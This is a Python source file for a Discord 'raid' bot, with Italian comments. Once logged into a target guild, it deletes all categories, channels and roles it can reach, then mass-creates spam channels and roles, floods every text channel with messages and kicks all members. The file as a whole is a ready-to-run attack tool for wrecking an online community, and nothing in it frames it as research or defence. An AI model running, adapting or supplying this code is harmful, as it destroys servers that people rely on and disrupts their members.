import argparse
import discord
from colorama import Fore, Style, init

init(autoreset=True)

# Parser degli argomenti
parser = argparse.ArgumentParser(description="Raidbot Discord Bot")
parser.add_argument("--token", type=str, required=True, help="Discord bot token")
parser.add_argument("--guild_id", type=int, required=True, help="Guild ID for the bot to operate in")
args = parser.parse_args()

token = args.token
guild_id = args.guild_id

intents = discord.Intents.all()
bot = discord.Client(intents=intents)

# Funzioni di raid
async def delete_all(guild):
    bot_member = guild.get_member(bot.user.id)
    for category in guild.categories:
        try:
            await category.delete()
            print(f'{Fore.MAGENTA}Deleted category {category.name}{Fore.RESET}')
        except Exception as e:
            print(f'{Fore.RED}Error deleting category {category.name}: {e}{Fore.RESET}')
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.MAGENTA}Deleted channel {channel}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error deleting channel {channel}: {e}{Fore.RESET}")
    for role in guild.roles:
        try:
            if not role.is_default() and role < bot_member.top_role:
                await role.delete()
                print(f"{Fore.MAGENTA}Deleted role {role}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error deleting role {role}: {e}{Fore.RESET}")

async def create_channel(guild):
    for _ in range(150):
        try:
            for i in range(10):
                await guild.create_text_channel(name="Image being raided")
            print(f"{Fore.MAGENTA}Created 10 channel{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error creating channel: {e}{Fore.RESET}")

async def create_role(guild):
    for _ in range(150):
        try:
            for i in range(10):
                await guild.create_role(name="Immage being raided")
            print(f"{Fore.MAGENTA}Created 10 role{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error creating role: {e}{Fore.RESET}")

async def spam_message(guild):
    for _ in range(150):
        for channel in guild.text_channels:
            try:
                await channel.send("Immage being raided")
                print(f"{Fore.MAGENTA}Sent message in {channel.name}{Fore.RESET}")
            except Exception as e:
                print(f"{Fore.RED}Error sending message: {e}{Fore.RESET}")

async def rename_guild(guild):
    try:
        await guild.edit(name="Immage being raided")
        print(f"{Fore.MAGENTA}Renamed guild{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}Error renaming guild: {e}{Fore.RESET}")

async def kick_all_members(guild):
    bot_member = guild.get_member(bot.user.id)
    for member in guild.members:
        try:
            if member != bot_member:
                await member.kick(reason="Immage being raided")
                print(f"{Fore.MAGENTA}Kicked {member.name}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Error kicking {member.name}: {e}{Fore.RESET}")

async def nuke_setup(guild):
    await delete_all(guild)
    await create_channel(guild)
    await create_role(guild)
    await spam_message(guild)
    #await rename_guild(guild)
    await kick_all_members(guild)
    print(f"{Fore.MAGENTA}Nuke setup completed.{Fore.RESET}")

@bot.event
async def on_ready():
    print(f"{Fore.MAGENTA}Logged in as {bot.user} (ID: {bot.user.id}){Fore.RESET}")
    guild = bot.get_guild(guild_id)
    if guild:
        print(f"{Fore.MAGENTA}Nuking guild: {guild.name} ({guild.id}){Fore.RESET}")
        await nuke_setup(guild)
    else:
        print(f"{Fore.RED}Bot is not in the specified guild!{Fore.RESET}")

if __name__ == "__main__":
    bot.run(token)
